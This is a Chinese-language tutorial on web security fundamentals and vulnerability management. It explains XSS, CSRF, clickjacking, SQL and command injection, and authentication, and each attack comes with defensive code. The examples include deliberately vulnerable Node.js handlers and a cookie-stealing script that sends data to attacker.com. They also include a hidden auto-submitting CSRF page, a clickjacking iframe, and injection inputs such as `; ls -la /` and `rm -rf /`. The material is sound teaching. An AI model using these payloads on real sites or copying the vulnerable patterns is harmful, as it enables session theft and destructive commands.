## 五、Web 安全基础

> 核心目标：**建立全面的安全防护思维**，**系统理解攻防机制**，能够**识别潜在威胁**并**实施有效防护**。

### 5.1 威胁模型与安全思维
- **安全设计原则**：在系统设计之初就融入安全考量。
  - **最小权限原则 (Principle of Least Privilege)**: 程序、用户或系统只应拥有完成其任务所必需的最少权限。限制攻击者获得权限后可造成的损害范围。
  - **纵深防御 (Defense in Depth)**: 部署多层、多样化的安全控制措施。单一防御点被突破时，其他层次仍能提供保护。例如，同时使用 WAF、输入验证和输出编码来防御 XSS。
  - **安全默认配置 (Secure by Default)**: 系统的默认配置应该是安全的。需要用户显式操作才能降低安全级别，而不是反过来。例如，默认关闭不必要的服务端口。
  - **攻击面最小化 (Minimize Attack Surface)**: 减少系统暴露给不可信用户的入口点（API、端口、功能）。关闭不必要的功能，限制访问。
  - **不信任输入 (Never Trust User Input)**: 所有来自用户或外部系统的输入都应被视为潜在恶意的，必须进行严格验证和清理。
- **常见攻击者类型**：了解潜在对手有助于制定更有效的防御策略。
  - **脚本小子 (Script Kiddies)**: 技术水平不高，通常使用现成的工具和脚本进行攻击，目标随机性强。
  - **黑客与有组织团体 (Hackers / Organized Crime / APT)**: 技术水平较高，目标明确，可能出于经济利益、政治目的或间谍活动。APT (Advanced Persistent Threat) 通常指有国家背景的、持续性的高级攻击。
  - **内部威胁 (Insider Threats)**: 来自组织内部的员工、前员工或合作伙伴，可能利用其合法权限进行恶意活动或无意中造成安全事件。
- **安全资产识别**：明确需要保护的对象。
  - **敏感数据**:
    - **个人身份信息 (PII)**: 姓名、身份证号、电话、地址、邮箱等。
    - **认证凭证**: 用户名、密码哈希、API 密钥、Session ID、Token。
    - **支付信息**: 信用卡号、银行账号。
    - **业务机密**: 商业计划、客户列表、源代码、算法。
  - **功能资产**:
    - **管理接口**: 后台管理系统、数据库管理工具。
    - **支付系统**: 处理交易的核心模块。
    - **核心业务流程**: 用户注册、登录、下单、内容发布等关键功能。
    - **用户账户与权限系统**。
  - **基础设施**:
    - **服务器**: Web 服务器、应用服务器、数据库服务器。
    - **网络设备**: 防火墙、路由器、交换机。
    - **第三方服务**: 依赖的外部 API、云服务、身份提供商。
    - **声誉**: 公司品牌形象和信誉。

### 5.2 常见攻击手段解析

#### 5.2.1 跨站脚本攻击 (XSS - Cross-Site Scripting)
- **原理**: 攻击者将恶意脚本注入到受信任的网站中，当其他用户访问该网站时，恶意脚本在用户的浏览器中执行，从而窃取用户信息、篡改页面内容或执行其他恶意操作。
- **XSS 类型**:
  - **存储型 XSS (Stored/Persistent XSS)**:
    - *场景*: 一个简单的评论系统，后端未对用户评论进行充分过滤。
    - *易受攻击的代码 (Node.js + Express 伪代码)*:
      ```javascript
      // Server-side (Node.js/Express)
      app.post('/add-comment', (req, res) => {
        const commentText = req.body.comment; // Raw user input
        // !!! DANGER: Storing raw user input !!!
        db.saveComment(commentText);
        res.redirect('/comments');
      });

      app.get('/comments', (req, res) => {
        const comments = db.getComments();
        let html = '<h1>Comments</h1>';
        comments.forEach(comment => {
          // !!! DANGER: Rendering raw user input !!!
          html += `<div class="comment">${comment.text}</div>`;
        });
        res.send(html);
      });
      ```
    - *攻击者提交的评论*: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`
    - *后果*: 当其他用户查看评论页面时，他们的 Cookie 会被发送到攻击者的服务器。
  - **反射型 XSS (Reflected XSS)**:
    - *场景*: 一个搜索页面，将搜索词直接显示在结果页上。
    - *易受攻击的代码 (Node.js + Express 伪代码)*:
      ```javascript
      app.get('/search', (req, res) => {
        const query = req.query.q; // Raw query from URL parameter
        const results = db.search(query);
        // !!! DANGER: Reflecting raw user input !!!
        let html = `<h2>Search results for: ${query}</h2>`;
        // ... render search results ...
        res.send(html);
      });
      ```
    - *攻击者构造的恶意链接*: `http://example.com/search?q=<script>alert('XSS!')</script>`
    - *后果*: 诱导用户点击此链接后，用户的浏览器会执行 `<script>alert('XSS!')</script>`。
  - **DOM 型 XSS (DOM-based XSS)**:
    - *场景*: 前端 JavaScript 根据 URL 的 hash 值动态修改页面内容。
    - *易受攻击的代码 (前端 JS)*:
      ```javascript
      // Frontend JavaScript
      function displayContentFromHash() {
          const contentDiv = document.getElementById('welcome-message');
          try {
              // !!! DANGER: Using location.hash directly in innerHTML !!!
              const userName = decodeURIComponent(location.hash.substring(1)); // Get name from #<name>
              if (userName) {
                  contentDiv.innerHTML = 'Welcome, ' + userName + '!'; // Vulnerable point
              }
          } catch (e) {
              console.error("Error processing hash", e);
          }
      }

      window.addEventListener('hashchange', displayContentFromHash);
      // Initial load
      displayContentFromHash();
      ```
    - *攻击者构造的恶意链接*: `http://example.com/#<img src=x onerror=alert(document.domain)>`
    - *后果*: 用户访问此链接时，`onerror` 中的脚本会在用户的浏览器中执行，无需经过服务器。
- **攻击手段 (注入点)**:
  - HTML 内容注入: `<div>{userInput}</div>` -> `<div><script>alert(1)</script></div>`
  - HTML 属性注入: `<img src="x" onerror="{userInput}">` -> `<img src="x" onerror="alert(document.cookie)">`
  - JavaScript 注入: `<script>var data = "{userInput}";</script>` -> `<script>var data = "";alert(1);//";</script>`
  - CSS 注入: `<div style="width: {userInput};">` -> `<div style="width: expression(alert(1));">` (旧 IE) 或利用 `background:url("javascript:alert(1)")` 等。
  - URL 注入: `<a href="{userInput}">Click Me</a>` -> `<a href="javascript:alert(document.cookie)">Click Me</a>`
- **防御措施**:
  - **内容安全策略 (CSP - Content Security Policy)**: 通过 HTTP 响应头定义浏览器允许加载和执行资源的策略，是缓解 XSS 的核心机制。
    - **配置指令**: `default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `frame-src`, `object-src`, `report-uri`/`report-to` 等。
    - **最佳实践**:
      - 限制脚本来源 (`script-src 'self' https://trusted.cdn.com`)。
      - 避免使用 `'unsafe-inline'` 和 `'unsafe-eval'`。如果必须内联，使用 `nonce` 或 `hash`。
      - 设置 `object-src 'none'`, `base-uri 'self'`。
      - 部署 `report-uri` 或 `report-to` 收集 CSP 违规报告。
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com 'nonce-RANDOM_VALUE'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; report-uri /csp-violation-report-endpoint;
    ```
  - **输出编码 (Output Encoding)**: 在将用户输入插入到 HTML/JS/CSS/URL 上下文之前，对其进行恰当的编码，使其被浏览器解释为数据而不是代码。
    - **HTML 上下文**: 编码 `<`, `>`, `&`, `"`, `'` 为 `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`。
      ```javascript
      // Example using a simple escape function (use robust libraries in production)
      function escapeHTML(str) {
         return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
      }
      // div.innerHTML = escapeHTML(userInput); // Safe rendering
      ```
    - **JavaScript 上下文**: 对非字母数字字符进行 `\xHH` 或 `\uXXXX` 编码。特别注意在 `<script>` 标签内输出 JSON 数据时的处理 (`JSON.stringify` 并做替换 `<` 防止 `<script>` 标签中断)。
      ```javascript
      const userData = { name: userInput };
      // Safe way to embed JSON in script tag
      const inlineScript = `var userData = ${JSON.stringify(userData).replace(/</g, '\\u003c')};`;
      // scriptTag.textContent = inlineScript;
      ```
    - **CSS 上下文**: 对非字母数字字符进行 `\HH` 编码。
    - **URL 上下文**: 使用 `encodeURIComponent` 对 URL 参数值进行编码。
    *使用成熟的库（如 OWASP Java Encoder, Python's `html.escape`, Node.js 的 `he` 库）进行编码。*
  - **框架内置防御**: 现代前端框架（React, Vue, Angular）通常默认对插入到模板中的数据进行 HTML 编码，能防御大部分 HTML 内容注入型 XSS。但需注意 `dangerouslySetInnerHTML` (React), `v-html` (Vue) 等显式禁用转义的功能，以及在框架外直接操作 DOM 的场景。
  - **输入验证与过滤 (Input Validation/Sanitization)**:
    - **验证**: 检查输入是否符合预期格式、类型、长度、范围（如邮箱格式、数字范围）。
    - **过滤/清理**: 移除或编码输入中的潜在危险字符或标签。使用白名单方法（只允许已知安全的标签和属性）通常比黑名单（禁用已知危险标签）更安全。可以使用 `DOMPurify` (前端) 或类似库 (后端) 进行 HTML 清理。
      ```javascript
      // Frontend sanitization using DOMPurify
      // import DOMPurify from 'dompurify';
      // const cleanHTML = DOMPurify.sanitize(userInput);
      // contentDiv.innerHTML = cleanHTML;
      ```
  - **HTTPOnly Cookie**: 设置 Cookie 的 `HttpOnly` 属性，禁止客户端 JavaScript 访问该 Cookie，即使发生 XSS，攻击者也无法直接读取敏感 Cookie（如 Session ID）。
  - **X-XSS-Protection 响应头**: (已废弃，被 CSP 取代) 尝试启用浏览器内置的 XSS 过滤器。`X-XSS-Protection: 1; mode=block`。

#### 5.2.2 跨站请求伪造 (CSRF - Cross-Site Request Forgery)
- **原理**: 攻击者诱导已登录的受害者访问一个恶意页面或点击一个链接...
- **攻击场景**:
  - *场景*: 一个允许用户修改邮箱地址的功能，仅通过 Cookie 验证用户身份。
  - *易受攻击的 POST 请求处理 (Node.js + Express 伪代码)*:
    ```javascript
    app.post('/change-email', (req, res) => {
      const sessionId = req.cookies.sessionId;
      if (isValidSession(sessionId)) { // Assume function checks session validity
        const userId = getUserIdFromSession(sessionId);
        const newEmail = req.body.new_email; // Get email from form data
        // !!! DANGER: No CSRF token check !!!
        db.updateUserEmail(userId, newEmail);
        res.send('Email updated successfully!');
      } else {
        res.status(401).send('Not logged in.');
      }
    });
    ```
  - *攻击者在恶意网站 (attacker.com) 设置的页面*:
    ```html
    <!-- attacker.com/attack.html -->
    <html>
      <body>
        <h1>Win a Prize!</h1>
        <form id="csrf-form" action="http://victim-site.com/change-email" method="POST" style="display:none;">
          <input type="hidden" name="new_email" value="attacker@example.com">
        </form>
        <script>
          // Automatically submit the form when the page loads
          document.getElementById('csrf-form').submit();
        </script>
        <p>Your prize is being processed...</p>
      </body>
    </html>
    ```
  - *后果*: 如果已登录 `victim-site.com` 的用户访问了 `attacker.com/attack.html`，浏览器会自动向 `victim-site.com/change-email` 发送 POST 请求，并携带用户的 `sessionId` Cookie。服务器验证 Cookie 通过后，会将用户的邮箱修改为 `attacker@example.com`。
- **防御措施**:
  - **CSRF Token (Synchronizer Token Pattern)**: **核心防御手段**。
    - *实现思路 (Node.js + Express + csurf)*:
      ```javascript
      const csrf = require('csurf');
      const cookieParser = require('cookie-parser');

      const csrfProtection = csrf({ cookie: true }); // Use cookie to store secret

      app.use(cookieParser());

      // Render form with CSRF token
      app.get('/settings', csrfProtection, (req, res) => {
        res.render('settings', { csrfToken: req.csrfToken() }); // Pass token to template
      });

      // Handle form submission, middleware verifies token automatically
      app.post('/change-email', csrfProtection, (req, res) => {
        // If code reaches here, CSRF token is valid
        const sessionId = req.cookies.sessionId;
        if (isValidSession(sessionId)) {
            const userId = getUserIdFromSession(sessionId);
            const newEmail = req.body.new_email;
            db.updateUserEmail(userId, newEmail);
            res.send('Email updated successfully!');
        } else {
             res.status(401).send('Not logged in.');
        }
      });

      // Handle AJAX (example)
      app.get('/get-csrf-token', csrfProtection, (req, res) => {
          res.json({ csrfToken: req.csrfToken() });
      });
      app.post('/api/update', csrfProtection, (req, res) => { /* ... */});
      // Frontend fetches token and includes it in 'X-CSRF-Token' header or request body for AJAX POST/PUT/DELETE
      ```
      *前端模板需包含 `<input type="hidden" name="_csrf" value="<%= csrfToken %>">`*
  - **SameSite Cookie 属性**:
    - `Strict`: 完全禁止第三方请求携带 Cookie。
    - `Lax`: (推荐默认) 允许部分顶层导航和安全的 HTTP 方法携带 Cookie。
    - `None`: 允许任何第三方请求携带 Cookie (需配合 `Secure`)。
    *将 Session Cookie 设置为 `SameSite=Lax` 或 `Strict`。*
    ```javascript
    // Node.js/Express example
    res.cookie('sessionId', 'abcdef12345', { sameSite: 'Lax', httpOnly: true, secure: true });
    ```
  - **检查 Referer / Origin 请求头**:
    - 在服务器端检查 `Origin` 或 `Referer` 是否来自允许的域名列表。
    - *局限性*: 浏览器可能不发送，可能被绕过。作为辅助手段。
      ```javascript
      app.post('/sensitive-action', (req, res) => {
        const origin = req.headers.origin;
        const referer = req.headers.referer;
        const allowedOrigins = ['http://localhost:3000', 'https://yourapp.com'];

        // Basic check (can be bypassed, use CSRF tokens primarily)
        if (origin && !allowedOrigins.includes(origin)) {
             console.warn(`Potential CSRF attempt from origin: ${origin}`);
             return res.status(403).send('Forbidden: Invalid Origin');
        }
        // Or check referer start
        if (referer && !referer.startsWith('https://yourapp.com/')) {
             console.warn(`Potential CSRF attempt from referer: ${referer}`);
             return res.status(403).send('Forbidden: Invalid Referer');
        }

        // Proceed with action if origin/referer is valid (or missing but accepted) AND CSRF token is valid
        // ... handle action ...
      });
      ```
  - **要求用户二次验证**: 对于非常敏感的操作（如修改密码、支付），强制用户重新输入密码或进行 MFA 验证。

#### 5.2.3 点击劫持 (Clickjacking)
- **攻击原理**: 攻击者创建一个透明的或伪装的 `<iframe>`...
  - *场景*: 目标网站有一个“删除账户”按钮。
  - *攻击者页面 (attacker.com)*:
    ```html
    <html>
      <head>
        <title>Fun Game!</title>
        <style>
          #victim-frame {
            position: absolute;
            /* Adjust top/left precisely to align the target button */
            top: 50px;
            left: 100px;
            width: 300px; /* Adjust size */
            height: 200px;
            opacity: 0.01; /* Make iframe nearly invisible */
            z-index: 2;
            border: none; /* Remove border */
          }
          #decoy-content {
            position: absolute;
            top: 0;
            left: 0;
            width: 500px;
            height: 300px;
            z-index: 1;
            text-align: center;
            padding-top: 150px; /* Position decoy button text */
          }
          #decoy-content button {
            padding: 15px;
            font-size: 1.2em;
          }
        </style>
      </head>
      <body>
        <!-- The invisible iframe loading the target page -->
        <iframe id="victim-frame" src="http://victim-site.com/settings"></iframe>

        <!-- The visible decoy content the user interacts with -->
        <div id="decoy-content">
          <p>Click the button below to win a prize!</p>
          <button>Claim Your Prize!</button> <!-- This is what the user thinks they are clicking -->
        </div>
      </body>
    </html>
    ```
  - *后果*: 用户以为自己点击的是“Claim Your Prize!”按钮，实际上点击的是透明 iframe 中对应位置的目标网站上的危险按钮（如“删除账户”）。
- **防御措施**:
  - **X-Frame-Options 响应头**: (较旧，但广泛支持)
    - `DENY`: 禁止在任何 frame 中加载。
    - `SAMEORIGIN`: 只允许同源 frame 加载。
    ```javascript
    // Node.js/Express
    app.use((req, res, next) => {
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
      next();
    });
    ```
  - **CSP frame-ancestors 指令**: (现代标准，更灵活)
    - `frame-ancestors 'none'`: 同 `DENY`。
    - `frame-ancestors 'self'`: 同 `SAMEORIGIN`。
    - `frame-ancestors https://trusted.com`: 允许指定来源。
    ```javascript
    // Node.js/Express
    app.use((req, res, next) => {
      // Prioritize CSP over X-Frame-Options if both are set
      res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
      next();
    });
    ```
  - **JavaScript 框架防御 (Frame Busting)**: (不可靠，可被绕过)
    ```javascript
    // Frontend JavaScript (less reliable)
    if (top !== self) {
      try {
        // Attempt to break out of the frame
        top.location.replace(self.location.href);
      } catch (e) {
        console.warn("Could not break out of frame.");
        // Optionally hide content or show a warning
        // document.body.style.display = 'none';
      }
    }
    ```

#### 5.2.4 注入攻击 (Injection Attacks)
- **SQL 注入 (SQL Injection)**:
  - *场景*: 一个简单的登录验证。
  - *易受攻击的代码 (Node.js + 伪 DB Driver)*:
    ```javascript
    // Assume db.query executes SQL directly
    function checkLogin(username, password, callback) {
      // !!! DANGER: Directly concatenating user input into SQL query !!!
      const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
      console.log("Executing SQL:", sql); // Log for demonstration
      db.query(sql, (err, results) => {
        if (err) return callback(err);
        if (results.length > 0) {
          callback(null, true); // Login successful
        } else {
          callback(null, false); // Login failed
        }
      });
    }

    // Attacker inputs:
    // Username: admin'--
    // Password: (anything, doesn't matter)
    // Resulting SQL: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
    // The '--' comments out the rest of the line, bypassing the password check.

    // Another attack input:
    // Username: ' OR '1'='1
    // Password: ' OR '1'='1
    // Resulting SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
    // The '1'='1' condition is always true, potentially logging in as the first user.
    ```
  - **防御**: **使用参数化查询 / 预编译语句**。
    ```javascript
    // Node.js + mysql2 library (example of parameterized query)
    const mysql = require('mysql2/promise'); // Using promise version

    async function checkLoginSecure(username, password) {
      const connection = await mysql.createConnection({ /* db config */ });
      try {
        // GOOD: Use placeholders (?) and pass values as an array
        const sql = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';
        // Assume password is hashed securely before comparison
        const passwordHash = await calculatePasswordHash(password); // Use bcrypt etc.
        const [results] = await connection.execute(sql, [username, passwordHash]);

        return results.length > 0;
      } finally {
        await connection.end();
      }
    }
    ```
- **命令注入 (Command Injection)**:
  - *场景*: 提供一个功能，允许用户查询某个域名的 IP 地址，后台使用 `ping` 命令实现。
  - *易受攻击的代码 (Node.js)*:
    ```javascript
    const { exec } = require('child_process');

    app.get('/lookup', (req, res) => {
      const domain = req.query.domain; // User input
      // !!! DANGER: Directly using user input in a shell command !!!
      const command = `ping -c 1 ${domain}`;
      console.log(`Executing: ${command}`);

      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error(`exec error: ${error}`);
          return res.status(500).send(`Error: ${stderr || error.message}`);
        }
        res.type('text/plain').send(`Ping output:\n${stdout}`);
      });
    });

    // Attacker input: ?domain=example.com; ls -la /
    // Resulting command: ping -c 1 example.com; ls -la /
    // The ';' allows executing a second command (ls -la /), revealing directory contents.

    // Attacker input: ?domain=`rm -rf /`
    // Resulting command: ping -c 1 `rm -rf /`
    // Backticks cause command substitution (if shell allows), potentially disastrous.
    ```
  - **防御**: **避免调用 Shell，使用安全的 API，严格验证输入**。
    ```javascript
    const dns = require('dns').promises; // Use Node.js built-in DNS module
    const { execFile } = require('child_process'); // Safer alternative to exec

    app.get('/lookup-safer-dns', async (req, res) => {
      const domain = req.query.domain;
      // GOOD: Validate input format (basic example)
      if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
          return res.status(400).send('Invalid domain format');
      }
      try {
        // GOOD: Use built-in DNS module, avoids shell execution
        const addresses = await dns.lookup(domain, { all: true });
        res.json(addresses);
      } catch (error) {
        res.status(500).send(`DNS lookup failed: ${error.message}`);
      }
    });

    app.get('/lookup-safer-ping', (req, res) => {
       const domain = req.query.domain;
       if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
           return res.status(400).send('Invalid domain format');
       }
       // GOOD: Use execFile, pass arguments as an array, avoids shell interpretation
       execFile('ping', ['-c', '1', domain], (error, stdout, stderr) => {
           if (error) {
               console.error(`execFile error: ${error}`);
               // Handle ping errors appropriately (e.g., host unreachable)
               return res.status(500).send(`Ping execution failed: ${stderr || error.message}`);
           }
           res.type('text/plain').send(`Ping output:\n${stdout}`);
       });
    });
    ```
- **其他注入**:
  - **LDAP 注入**: ...防御方法类似 SQL 注入...
  - **NoSQL 注入**: ...防御方法包括使用安全的 API (如 Mongoose), 验证清理输入...
  - **模板注入 (Template Injection)**: ...防御方法是避免将用户输入直接作为模板内容, 使用安全的模板 API...
  - **XPath 注入 / XML 注入 (XXE - XML External Entity)**: ...防御方法包括禁用外部实体解析, 使用安全的 XML 解析器配置...

#### 5.2.5 中间人攻击 (MITM - Man-in-the-Middle)
- **攻击原理**: 攻击者置身于通信双方之间...
- **攻击场景**: 不安全的 Wi-Fi, DNS 欺骗, SSL Stripping...
- **防御措施**:
  - **HTTPS 全站加密**: ...
  - **HSTS (HTTP Strict Transport Security)**: ...
  - **证书透明度 (Certificate Transparency - CT)**: ...
  - **公钥固定 (Public Key Pinning - HPKP)**: (已废弃)...

### 5.3 身份认证与授权

#### 5.3.1 身份认证安全 (Authentication)
- **密码认证安全**:
  - **安全密码策略**: 长度, 复杂度, 历史, 常见密码检查...
  - **密码存储**: **绝不能明文存储密码**。
    - **加盐哈希 (Salted Hashing)** + **慢哈希算法 (KDF)**: (如 bcrypt, scrypt, Argon2id)
      ```javascript
      // Node.js example using bcrypt
      const bcrypt = require('bcrypt');
      const saltRounds = 10; // Cost factor - adjust based on hardware

      async function hashPassword(plainPassword) {
        try {
          const salt = await bcrypt.genSalt(saltRounds);
          const hash = await bcrypt.hash(plainPassword, salt);
          // Store the hash (which includes the salt) in the database
          return hash;
        } catch (error) {
          console.error("Error hashing password:", error);
          throw error;
        }
      }

      async function verifyPassword(plainPassword, storedHash) {
        try {
          const match = await bcrypt.compare(plainPassword, storedHash);
          return match; // true or false
        } catch (error) {
          console.error("Error verifying password:", error);
          return false;
        }
      }

      // Usage
      // const hashedPassword = await hashPassword('user-secret-password');
      // db.saveUserPassword(userId, hashedPassword);
      // const isValid = await verifyPassword('user-input-password', storedUserHash);
      ```
  - **防御暴力破解**: 速率限制, 验证码, 账户锁定...
- **多因素认证 (MFA - Multi-Factor Authentication)**: 知识因素, 拥有因素, 生物因素...
  - **实现方式**: TOTP, 短信/邮件, 推送通知, FIDO U2F / WebAuthn...
- **Session 管理安全**:
  - **Session 创建与失效**: 不可预测 ID, 登录后重新生成, 合理超时, 退出时销毁...
  - **Cookie 安全属性**: `HttpOnly`, `Secure`, `SameSite` (`Lax` 或 `Strict`), `Path`, `Domain`, `Expires`/`Max-Age`...
  - **Session 固定攻击防御**: 登录成功后强制重新生成 Session ID。

#### 5.3.2 OAuth 2.0 与 OpenID Connect (OIDC)
- **OAuth 2.0**: 授权框架...
- **OpenID Connect (OIDC)**: 身份认证层...
- **流程安全**:
  - **授权码模式 + PKCE**: (推荐) 防止授权码截获...
  - **常见配置错误**: 重定向 URI 验证不严格, State 参数缺失或验证不足, 令牌泄露...
- **JWT (JSON Web Token)**: 紧凑、自包含的令牌格式...
  - **结构**: Header, Payload, Signature...
  - **验证**: 签名有效性, 标准声明 (`iss`, `aud`, `exp`, `nbf`, `iat`)...
  - **安全实践**: 强密钥, HTTPS, 短过期时间 (`exp`), 使用刷新令牌, 不存敏感信息, 关键操作重验证...
  - **常见漏洞**: 算法混淆 (`alg=none`), 密钥泄露, 弱密钥, 未验证签名/`exp`...
    ```javascript
    // Node.js JWT validation example (using jsonwebtoken library)
    const jwt = require('jsonwebtoken');
    const publicKey = getPublicKey(); // Load RSA public key for RS256
    const expectedIssuer = 'https://auth.example.com';
    const expectedAudience = 'https://api.example.com';

    function verifyToken(token) {
      try {
        const decoded = jwt.verify(token, publicKey, {
          algorithms: ['RS256'], // Explicitly specify allowed algorithms
          issuer: expectedIssuer,
          audience: expectedAudience,
          // clockTimestamp: Math.floor(Date.now() / 1000) // Can specify current time if needed
        });
        // Token is valid, signature verified, claims (iss, aud, exp) validated
        return { valid: true, payload: decoded };
      } catch (err) {
        // Token is invalid (expired, wrong signature, wrong issuer/audience, etc.)
        console.error('JWT Verification Failed:', err.message);
        return { valid: false, error: err };
      }
    }
    ```

#### 5.3.3 权限控制 (Authorization)
- **定义**: 验证用户是否有权执行特定操作或访问特定资源...
- **权限模型**: RBAC, ABAC, ReBAC...
- **最佳实践**: **服务端强制执行**, 前端隐藏 + 后端校验, API 权限粒度设计, 默认拒绝...
  ```javascript
  // Node.js/Express middleware example for role-based access
  function requireRole(role) {
    return (req, res, next) => {
      const user = req.user; // Assume user object attached by authentication middleware
      if (user && user.roles && user.roles.includes(role)) {
        next(); // User has the required role, proceed
      } else {
        // User does not have the role or is not authenticated
        res.status(403).send('Forbidden: Insufficient permissions');
      }
    };
  }

  // Usage in route definition
  app.get('/admin/dashboard', requireRole('admin'), (req, res) => {
    res.render('admin-dashboard');
  });

  app.delete('/api/users/:id', requireRole('admin'), (req, res) => {
    // Handle user deletion... must be admin
  });
  ```

### 5.4 Web 应用安全最佳实践

#### 5.4.1 安全响应头 (Security Headers)
- **Content-Security-Policy (CSP)**: ...
- **X-Content-Type-Options**: `nosniff`
- **Strict-Transport-Security (HSTS)**: `max-age=...; includeSubDomains; preload`
- **X-Frame-Options**: `SAMEORIGIN` or `DENY` (or use CSP `frame-ancestors`)
- **Referrer-Policy**: `strict-origin-when-cross-origin` or stricter
- **Permissions-Policy**: Disable unnecessary features (`geolocation=(), microphone=(), camera=()`)
  ```javascript
  // Node.js/Express middleware to set multiple security headers
  app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Permissions-Policy', "geolocation=(), microphone=(), camera=()");
    // HSTS should ideally only be sent over HTTPS connections
    if (req.secure) {
        res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    }
    // CSP needs careful configuration per application
    // res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'; object-src 'none'; ...");
    next();
  });
  ```

#### 5.4.2 安全开发生命周期 (SDL - Secure Development Lifecycle)
- **需求阶段**: 威胁建模, 安全需求...
- **设计阶段**: 安全设计评审, 原则应用...
- **开发阶段**: 安全编码指南, SAST, Code Review...
- **测试阶段**: DAST, 渗透测试, 漏洞修复...
- **部署与维护**: 安全配置, 漏洞管理, 监控审计...

#### 5.4.3 前端安全构建与配置
- **依赖安全管理**:
  - **漏洞检查工具**:
    - `npm audit` / `yarn audit` / `pnpm audit`:
      ```bash
      npm audit
      npm audit fix # Attempts to automatically fix vulnerabilities
      ```
    - **Snyk**: `snyk test`, `snyk monitor`
    - **OWASP Dependency-Check**...
  - **依赖更新策略**: 定期检查, 及时更新, 使用 lock 文件, 评估兼容性...
- **构建安全**:
  - **源代码保护**: 代码混淆, 代码分割...
  - **敏感信息处理**: 避免硬编码, 使用环境变量 (注意客户端暴露风险), 配置服务, 后端代理...
  - **子资源完整性 (SRI - Subresource Integrity)**: 确保 CDN 资源未被篡改。
    ```html
    <script src="https://cdn.jsdelivr.net/npm/library@1.2.3/library.min.js"
            integrity="sha384-HASH_VALUE_PROVIDED_BY_CDN"
            crossorigin="anonymous"></script>
    ```
    *构建工具 (like webpack-subresource-integrity) 可以自动生成 SRI 哈希值。*

## 六、安全测试与漏洞管理

> 核心目标：**掌握安全测试方法**，**建立完善的漏洞响应流程**，确保**快速有效地应对安全威胁**。

### 6.1 安全测试方法
- **静态应用安全测试 (SAST)**:
  - **原理**: 分析源代码、字节码等，不运行代码。
  - **工具**: ESLint 安全插件 (`eslint-plugin-security`), SonarQube, Semgrep, Checkmarx, Veracode...
  - **优点**: 开发早期发现, 覆盖率高。
  - **缺点**: 误报, 无法发现运行时漏洞。
  - **配置为代码**: 检查 IaC 文件 (Terraform, Dockerfile) 等。
- **动态应用安全测试 (DAST)**:
  - **原理**: 模拟攻击者，在运行状态下测试应用。黑盒。
  - **工具**: OWASP ZAP, Burp Suite, Acunetix, Netsparker...
  - **优点**: 发现运行时漏洞, 误报相对较低。
  - **缺点**: 无法覆盖所有代码, 对复杂认证场景效果可能不佳。
  - **测试用例设计**: 基于 OWASP Top 10 等。
- **交互式应用安全测试 (IAST)**:
  - **原理**: 结合 SAST 和 DAST，通过 Agent 监控运行时内部数据流。
  - **优点**: 准确性较高，能定位到具体代码行。
  - **缺点**: 对应用性能有一定影响，需要 Agent 支持。
- **渗透测试 (Penetration Testing)**:
  - **原理**: 安全专家模拟真实攻击，评估实际安全状况。
  - **方法论**: 黑盒, 灰盒, 白盒。
  - **范围与边界**: 明确目标、手段、时间。
  - **授权**: **必须获得书面授权**。
  - **报告**: 详细漏洞、风险、复现步骤、修复建议。
  - **常见工具**: Metasploit, Nmap, Burp Suite, SQLMap, Wireshark, Nessus...

### 6.2 漏洞响应与管理
- **漏洞披露**:
  - **负责任的披露 (Responsible Disclosure)**: 发现者先将漏洞秘密报告给厂商，给予其修复时间，之后再公开（或不公开）。
  - **漏洞奖励计划 (Bug Bounty Program)**: 组织设立平台和奖金，鼓励安全研究人员发现并报告漏洞。
- **漏洞响应流程 (Vulnerability Response Process)**:
  1.  **发现/报告 (Discovery/Reporting)**: 通过内部测试、外部报告、监控等发现漏洞。
  2.  **验证 (Verification)**: 确认漏洞的存在和可复现性。
  3.  **评估与分类 (Assessment & Triage)**:
      - 使用 **CVSS (Common Vulnerability Scoring System)** 对漏洞严重性进行评分（考虑攻击向量、复杂度、所需权限、用户交互、影响范围等）。
      - 评估漏洞对业务的实际影响。
  4.  **修复优先级 (Prioritization)**: 根据严重性评分和业务影响确定修复的优先级和时间表。高危漏洞优先修复。
  5.  **修复 (Remediation)**: 开发、测试并部署漏洞补丁。
  6.  **验证修复 (Verification)**: 确认漏洞已被成功修复且未引入新的问题。
  7.  **沟通/发布 (Communication/Disclosure)**: (可选) 向用户或公众发布安全公告或补丁说明。
- **安全监控与告警**:
  - **日志分析**: 收集和分析应用日志、服务器日志、防火墙日志、WAF 日志等，识别可疑活动（如大量登录失败、异常请求模式）。使用 SIEM (Security Information and Event Management) 系统进行集中管理和分析。
  - **异常检测**: 建立系统行为基线，使用统计方法或机器学习检测与基线的显著偏离。
  - **攻击特征识别**: 使用 WAF (Web Application Firewall) 或 IDS/IPS (Intrusion Detection/Prevention System) 基于已知攻击签名或规则引擎来检测和（可选）阻止恶意请求。
  - **误报控制**: 调整监控规则和阈值，减少误报，避免告警疲劳。